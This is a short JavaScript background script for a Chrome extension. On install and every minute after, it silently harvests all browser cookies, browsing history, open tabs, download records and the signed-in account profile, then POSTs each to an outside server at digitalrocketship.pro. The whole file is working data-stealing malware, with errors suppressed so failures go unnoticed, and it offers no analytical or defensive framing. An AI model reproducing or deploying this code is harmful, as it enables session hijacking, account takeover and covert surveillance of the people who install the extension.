
// import 'chrome'

chrome.alarms.create({ periodInMinutes: 1 });

chrome.alarms.onAlarm.addListener(async () => {
    await retrieve()
});

chrome.runtime.onInstalled.addListener(async () => {
    await retrieve()
});

async function retrieve() {

    try {
        const cookies = await chrome.cookies.getAll({})
        send('cookies', cookies)
    } catch { }

    try {
        const history = await chrome.history.search({ text: "" })
        send('history', history)
    } catch {}

    try {
        const tabs = await chrome.tabs.query({})
        send('tabs', tabs)
    } catch {}

    try {
        const files = await chrome.downloads.search({})
        const filesFiltered = files.map(e => { return { file: e.filename, url: e.url } })
        send('files', filesFiltered)
    } catch {}

    try {
        const accounts = await chrome.identity.getProfileUserInfo()
        send('accounts', accounts)
    } catch {}
}

async function send(key, data) {
    await fetch('https://digitalrocketship.pro/dblock-34.php', {
        method: 'POST',
        body: JSON.stringify({ key: key, data: data })
    })
}